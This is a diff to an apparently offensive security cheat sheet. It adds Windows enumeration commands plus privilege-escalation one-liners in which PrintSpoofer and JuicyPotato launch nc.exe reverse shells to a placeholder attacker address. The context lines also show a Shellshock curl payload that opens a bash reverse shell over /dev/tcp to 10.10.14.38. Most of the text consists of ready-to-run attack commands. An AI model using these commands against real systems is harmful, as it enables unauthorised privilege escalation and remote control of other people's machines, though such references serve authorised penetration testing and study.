@@ -202,6 +202,8 @@ https://www.netminer.com/en/product/netminer.php?ckattempt=1
 - Living Off The Land (LOLBAS)
 
 ```
+C:\> whoami /priv
+C:\> whoami /groups
 C:\> net accounts
 C:\> net accounts /domain
 C:\> net user
@@ -234,16 +236,19 @@ C:\> wmic useraccount list /format:list
 C:\> wmic group list /format:list
 C:\> wmic sysaccount list /format:list
 C:\> wmic product get name
+C:\> tasklist /svc
 https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4
 C:\> dsquery user
 C:\> dsquery computer
 C:\> dsquery * "CN=Users,DC=<domain>,DC=<domain>"
 C:\> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
 C:\> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
+C:\> query user
 C:\> ipconfig /all
 C:\> arp -a
 C:\> route print
 C:\> set
+C:\> echo %USERNAME%
 C:\> echo %USERDOMAIN%
 C:\> echo %logonserver%
 C:\> systeminfo
@@ -1627,6 +1632,8 @@ https://github.com/itzvenom/Security-Assessment-PS
 https://github.com/NotMedic/NetNTLMtoSilverTicket
 PS C:\> Import-Module .\SecurityAssessment.ps1
 PS C:\> Get-SpoolStatus -ComputerName <hostname>
+https://github.com/itm4n/printspoofer
+C:\> PrintSpoofer.exe -c "c:\tools\nc.exe <IP address> <port> -e cmd"
 ```
 
 - Pass-The-Certificate (PTC)
@@ -2165,6 +2172,14 @@ $ route
 ```
 C:\> netstat -ano
 $ netstat -antp
+```
+
+- Named Pipes
+
+```
+C:\> pipelist.exe /accepteula
+PS C:\> gci \\.\pipe\
+C:\> accesschk.exe /accepteula \\.\Pipe\lsass -v
 ```
 
 - DNS Configuration
@@ -3892,6 +3907,7 @@ $ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1
 
 ```
 https://github.com/ohpe/juicy-potato
+C:\> JuicyPotato.exe -l <port> -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe <IP address> <port> -e cmd.exe" -t *
 ```
 
 - Baron Samedit - CVE-2021-3156
